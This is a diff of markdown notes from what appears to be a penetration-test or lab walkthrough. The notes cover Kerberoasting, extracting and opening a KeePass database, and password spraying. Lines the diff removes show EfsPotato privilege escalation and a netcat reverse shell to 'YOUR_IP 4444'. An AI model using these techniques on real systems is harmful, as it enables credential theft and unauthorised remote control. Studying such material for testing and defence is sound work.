@@ -58,14 +58,7 @@
   grep -r "RecentFiles" KeePass-2.58/
   ```
 - **If found**: Use `keepass2john` to extract hashes.
-
-#### **EfsPotato.exe (Privilege Escalation)**
-- **Possible Use**:
-  ```bash
-  EfsPotato.exe -i -e "whoami /priv"
-  ```
-- Checks for **SeImpersonatePrivilege** abuse (similar to JuicyPotato).
-
+- 
 ---
 
 ### **3. Next Steps**
@@ -95,24 +88,13 @@
    ```bash
    kpcli --kdb Passwords.kdbx --keyfile keyfile.key
    ```
-
-#### **If EfsPotato Works**
-- **Privilege Escalation**:
-  ```bash
-  EfsPotato.exe -i -e "nc.exe -e cmd YOUR_IP 4444"
-  ```
-
 ---
 
 ## **Conclusion**
 ### **Current Status**
 - **Kerberoasting**: Hashes obtained but not cracked yet.
 - **KeePass Database**: Still searching for `.kdbx` file.
-- **EfsPotato**: Potential privilege escalation path.
 
 ### **Next Moves**
 1. **Find KeePass DB** (Check `C:\Users\*\AppData\Local\Everything\*.db`).
 2. **Password Spraying** (Try `winrm_svc` with common passwords).
-3. **Exploit EfsPotato** if initial shell is obtained.
-
-Would you like a deeper dive into any of these steps? 🚀
